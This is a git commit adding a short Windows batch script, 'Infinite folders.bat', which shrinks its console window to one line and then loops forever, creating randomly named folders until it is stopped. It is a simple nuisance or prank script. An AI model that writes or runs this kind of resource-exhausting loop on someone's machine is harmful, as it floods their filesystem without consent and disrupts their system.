45bae6e7706ba7a0faa211488afdadd4667d877a
PPrrooggrraammeerr <81397961+PPrrooggrraammeerr@users.noreply.github.com>
2022-03-04 01:59:00 -0300

    Add files via upload

---
+++ Infinite folders.bat
@@ -0,0 +1,12 @@
+@echo off
+title Infinite folders
+color 0c
+mode con cols=20 lines=1
+goto :Infinite_folders
+:Infinite_folders
+mkdir %random% > nul
+goto :Infinite_folders
+cls
+goto :exit
+:exit
+exit
